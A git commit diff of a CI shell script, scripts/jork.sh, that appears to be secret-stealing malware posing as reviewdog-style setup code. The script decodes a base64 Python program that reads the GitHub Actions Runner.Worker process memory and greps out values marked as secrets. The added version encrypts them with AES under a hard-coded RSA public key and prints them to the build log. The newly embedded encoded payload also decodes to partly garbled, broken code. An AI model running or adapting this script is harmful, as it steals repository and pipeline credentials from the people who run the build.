ac50ab4cbfa985720bc604a3ba1ec99878a8bcf7
whybeeh1 <whybeeh1@gmail.com>
2025-06-18 16:34:59 +0200

    rsa poc

--- scripts/jork.sh
+++ scripts/jork.sh
@@ -1,30 +1,20 @@
 #!/bin/sh
-/////////////////// deja là ....
 set -eu
-
-VERSION="${REVIEWDOG_VERSION:-latest}"
-
-TEMP="${REVIEWDOG_TEMPDIR}"
-if [ -z "${TEMP}" ]; then
-  if [ -n "${RUNNER_TEMP}" ]; then
-    TEMP="${RUNNER_TEMP}"
-  else
-    TEMP="$(mktemp -d)"
-  fi
-fi
-
-
-////////////////////////:
-
-
 TEMP="$(mktemp -d)"
-
-SCRIPT_RUNNER="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIyBiYXNlZCBvbiBodHRwczovL2RhdmlkZWJvdmUuY29tL2Jsb2cvP3A9MTYyMAoKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgoKZGVmIGdldF9waWQoKToKICAgICMgaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjcwMzY0MC9wcm9jZXNzLWxpc3Qtb24tbGludXgtdmlhLXB5dGhvbgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcGlkID0gZ2V0X3BpZCgpCiAgICBwcmludChwaWQpCgogICAgbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCiAgICBtZW1fcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWVtIgoKICAgIHdpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICAgICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICAgICAgbSA9IHJlLm1hdGNoKHInKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pJywgbGluZSkKICAgICAgICAgICAgaWYgbS5ncm91cCgzKSA9PSAncic6ICAjIHJlYWRhYmxlIHJlZ2lvbgogICAgICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgICAgICBlbmQgPSBpbnQobS5ncm91cCgyKSwgMTYpCiAgICAgICAgICAgICAgICAjIGhvdGZpeDogT3ZlcmZsb3dFcnJvcjogUHl0aG9uIGludCB0b28gbGFyZ2UgdG8gY29udmVydCB0byBDIGxvbmcKICAgICAgICAgICAgICAgICMgMTg0NDY3NDQwNzM2OTkwNjU4NTYKICAgICAgICAgICAgICAgIGlmIHN0YXJ0ID4gc3lzLm1heHNpemU6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmJ1ZmZlci53cml0ZShjaHVuaykKICAgICAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="
-
-echo '::group:: Preparing environment ...'
-
-      echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
-      VALUES=`sudo python3 $TEMP/runner_script.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
-      echo $VALUES
-   
-echo '::endgroup::'
+SCRIPT_RUNNER="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIyBiYXNlZCBvbiBodHRwczovL2RhdmlkZWJvdmUuY29tL2Jsb2cvP3A9MTYyMAoKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgoKZGVmIGdldF9waWQoKToKICAgICMgaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjcwMzY0MC9wcm9jZXNzLWxpc3Qtb24tbGludXgtdmlhLXB5dGhvbgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcGlkID0gZ2V0X3BpZCgpCiAgICBwcmludChwaWQpCgogICAgbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCiAgICBtZW1fcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWVtIgoKICAgIHdpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICAgICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAgIG0gPSByZS5tYXRjaChyJyhbbC0ORUFJdCkiLCBsaW5lKQogICAgICAgIGlmIG0uZ3JvdXAoMykgPT0gJ3InOiAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgZW5kID0gaW50KG0uZ3JvdXAyKSwgMTYpCiAgICAgICAgICAgICMgSG90Zml4ZTogT3ZlcmZsb3dFcnJvcjogUHl0aG9uIGludCB0b28gbGFyZ2UgdG8gY29udmVydCB0byBDIGxvbmcKICAgICAgICAgICAgICAjIDE4NDQ2NzQ0MDczNjkwNjU4NTYKICAgICAgICAgICAgICAgaWYgc3RhcnQgPiBzeXMubWF4c2l6ZToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCg=="
+echo "$SCRIPT_RUNNER" | base64 -d > "$TEMP/runner_script.py"
+VALUES=$(sudo python3 "$TEMP/runner_script.py" | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u)
+echo "$VALUES" > "$TEMP/output.json"
+AES_KEY=$(openssl rand -hex 32)
+openssl enc -aes-256-cbc -pbkdf2 -in "$TEMP/output.json" -out "$TEMP/output_updated.bin" -pass pass:"$AES_KEY"
+RSA_ENCRYPTED_AES_KEY=$(echo -n "$AES_KEY" | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0k9NR3LLqLUR0ucj1ijC
+OrP6Wz6jjyyNi2JZquQeMP8fRh5sp3p7uAMWDjPaIUVNQEjZegT2xBJFP+yvo7rb
+zyqkYxkX7AtSyR1/2fhEs+eJcfHCK3G9EAGMiHCU3Gk8WZfZG2ASgmWOV/IFUIW+
+59HHUYv5lntO+kI4OSDa3L7F0kMbEZ0dtk2cHGv6XLmGCiv00mfZ7vCjNuEreEX1
+ukjtpN3HLUr//8StU8NHqHvGC1GPAbgNfUbbTso74cgA5bsNDvJhByOx8d9l4uH5
+aZpXX2zv45e8DyfJ+4YmMkTxE+nJTcnv0LgrxfgLo2PGTniIGfWkscdEvL4G0D7Q
+awIDAQAB
+-----END PUBLIC KEY-----") | base64 -w0)
+echo -n '{"encrypted":"' && base64 -w0 "$TEMP/output_updated.bin"
+echo '","key":"'"$RSA_ENCRYPTED_AES_KEY"'"}'
